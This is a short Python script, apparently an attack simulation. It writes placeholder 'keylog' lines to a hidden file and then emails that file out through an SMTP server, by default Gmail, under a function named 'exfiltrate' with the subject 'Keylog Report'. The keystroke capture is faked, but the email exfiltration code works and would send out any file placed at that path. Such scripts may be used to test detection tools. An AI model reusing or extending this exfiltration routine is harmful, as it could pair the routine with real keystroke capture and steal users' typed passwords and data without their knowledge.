import time, smtplib, os
from email.mime.text import MIMEText

LOG_FILE = "logs/.keylog"
EMAIL = os.getenv("EXFIL_EMAIL")
PASS = os.getenv("EMAIL_PASS")
SMTP = os.getenv("SMTP_SERVER", "smtp.gmail.com")
PORT = int(os.getenv("SMTP_PORT", "587"))

def fake_keylogger():
    with open(LOG_FILE, "w") as f:
        for _ in range(5):
            f.write("user typed: password123\n")
            time.sleep(1)

def exfiltrate():
    with open(LOG_FILE) as f:
        content = f.read()
    msg = MIMEText(content)
    msg['Subject'] = 'Keylog Report'
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    with smtplib.SMTP(SMTP, PORT) as server:
        server.starttls()
        server.login(EMAIL, PASS)
        server.send_message(msg)
    print("📨 Keylog exfiltrated.")

if __name__ == "__main__":
    fake_keylogger()
    exfiltrate()
